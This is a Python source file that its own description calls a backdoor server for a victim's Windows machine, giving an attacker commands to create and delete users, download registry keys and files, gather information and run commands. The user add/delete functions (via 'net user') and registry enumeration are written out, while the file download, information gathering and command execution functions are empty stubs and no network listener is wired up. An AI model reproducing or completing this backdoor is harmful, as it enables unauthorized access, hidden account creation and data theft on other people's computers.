#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "2.0.1"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the server program that creates a backdoor in a victims machine and gives an attacker to execute the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import subprocess, re, socket, time, struct
from turtledemo.chaos import f
from winreg import *

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len)

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
    return None

def create_user(name, pwd, log_file):
    #net user /add name pwd
    cmd_list = ["net", "user", "/add", name, pwd]
    subprocess.Popen(cmd_list, 0, None, None, log_file, log_file)


def delete_user(name, log_file):
    #net user /del name
    cmd_list = ["net", "user", "/del", name]
    subprocess.Popen(cmd_list, 0, None, None, log_file, log_file)


def download_registry_key(root, path, sock):
    key_hdl = CreateKey(root, path) # This is the key handle to the user key and path of existing keys
    num_subkeys, num_values, l_modified = QueryInfoKey(key_hdl)  # This gives the info about the registry keys
    print("SUBKEYS: %d\nVALUES: %d\n" % (num_subkeys, num_values))
    for i in range(num_subkeys):
        print(EnumKey(key_hdl, i))
    for i in range(num_values):
        v_name, v_data, d_type = EnumValue(key_hdl, i)
        print("%s : %s" %(v_name, v_data))

def download_file(file_name, sock):
    return None


def gather_information(log_name, sock):
    return None

def execute_command(cmd, error_log):
    return None


def main():
    log_file = open("log.txt", 'a')
    option = input("What do you wanna do? ")
    if option.upper() == "CU":
        create_user(input("Enter the username: "), input("Enter the password: "), log_file)
    elif option.upper() == "DU":
        delete_user(input("Enter the username: "), log_file)
    elif option.upper() == "DRK":
        download_registry_key(HKEY_CURRENT_USER, "Console", 0)

    return None


main()

